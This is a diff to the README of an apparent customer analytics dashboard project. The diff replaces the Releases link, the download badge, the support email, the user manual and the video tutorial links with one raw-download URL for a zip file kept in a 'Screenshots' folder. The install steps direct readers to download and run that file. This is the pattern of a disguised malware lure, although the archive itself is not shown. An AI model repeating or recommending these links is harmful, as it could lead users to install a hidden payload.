@@ -1,6 +1,6 @@
 # 🎯 Interactive-Customer-Analytics-Dashboard - Analyze Customer Data Effortlessly
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/releases)
+[![Download Release](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip%20Latest%https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -30,11 +30,11 @@ This dashboard is intended for business professionals, analysts, and anyone look
 
 To get started, visit the Releases page to download the dashboard.
 
-[Download Latest Release](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/releases)
+[Download Latest Release](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)
 
 ### How to Install
 
-1. Visit the [Releases page](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/releases).
+1. Visit the [Releases page](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip).
 2. Choose the latest version listed. 
 3. Download the installation file for your operating system.
 4. Open the downloaded file to start the installation. Follow the prompts on your screen to complete the process.
@@ -43,7 +43,7 @@ To get started, visit the Releases page to download the dashboard.
 
 Whenever a new version is available:
 
-1. Visit the [Releases page](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/releases).
+1. Visit the [Releases page](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip).
 2. Download the latest version.
 3. Run the installation file to update your current version.
 
@@ -80,13 +80,13 @@ If you encounter issues while using the dashboard:
 
 ## 📞 Support
 
-For further assistance, you can contact the support team at support@example.com. 
+For further assistance, you can contact the support team at https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip 
 
 ## 🌐 Resources
 
-- [User Manual](https://example.com/user-manual)
-- [Video Tutorials](https://example.com/tutorials)
+- [User Manual](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)
+- [Video Tutorials](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)
 
 For the latest updates, you can also keep an eye on our GitHub repository and follow the discussions there.
 
-[Download Latest Release](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/releases)
+[Download Latest Release](https://github.com/juankamaurel/Interactive-Customer-Analytics-Dashboard/raw/refs/heads/main/Interactive Customer Analytics Dashboard/Screenshots/Customer-Dashboard-Analytics-Interactive-v1.4.zip)
